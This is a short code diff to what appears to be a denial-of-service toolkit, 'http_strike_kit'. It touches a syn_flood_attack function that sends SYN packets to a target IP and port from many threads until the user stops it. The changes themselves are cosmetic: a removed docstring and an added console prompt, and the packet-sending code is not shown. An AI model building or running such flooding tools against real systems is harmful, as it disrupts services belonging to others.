@@ -1,5 +1,7 @@
 import socket
 
+import typer
+
 from http_strike_kit.utils.thread_exec import ThreadedExecutor
 
 
@@ -14,12 +16,7 @@ def _syn_once(target: str, port: int):
 
 
 def syn_flood_attack(target: str, port: int, workers: int) -> None:
-    """
-    send syn packets to target, run until the user interrupts.
-    :param target: ip address
-    :param port: port targets
-    :param workers: maximum workers to run at once.
-    """
+    typer.echo(typer.style("to stop Press CTRL+C to stop it.", fg=typer.colors.WHITE, bold=True))
     executor = ThreadedExecutor(max_workers=workers)
     executor.start()
     try:
